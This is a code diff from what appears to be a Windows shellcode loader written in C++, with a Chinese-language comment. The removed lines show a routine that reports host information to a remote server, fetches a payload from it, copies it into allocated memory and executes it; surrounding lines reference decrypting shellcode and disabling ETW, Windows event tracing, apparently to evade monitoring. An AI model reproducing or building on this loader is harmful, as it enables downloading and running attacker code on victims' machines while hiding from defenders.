@@ -101,32 +101,6 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
-
-
-	std::string url = VpsUrl;
-	send_info(url);
-	// fetch_index(url);
-	custom_sleep(1000 * 30); // 等待半分钟后开始轮询
-
-	std::vector<unsigned char> shellcode = fetch_payload(url);
-	if (shellcode.size() == 0) {
-		return;
-	}
-
-	LPVOID lpMem = NULL;
-	SIZE_T size = shellcode.size();
-	NTSTATUS status = AllocateMem(&lpMem, &size);
-	custom_sleep(500); // sleep 0.5s
-
-	memcpy(lpMem, shellcode.data(), size);
-	// DecryptShellcode(lpMem, size);
-
-
-
-	ExecuteShellcodeStruct execStruct = { 0 };
-	execStruct.lpMem = lpMem;
-	execStruct.memSize = size;
-	ExecuteShellcode(&execStruct);
 }
 
 
@@ -138,8 +112,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	initAllFunc();
 
 // ============================= TEST ===============================	
-	test();
-	return 0;
+	// test();
+	// return 0;
 // ============================= TEST END ===============================	
 
 	if (DisableETW) {
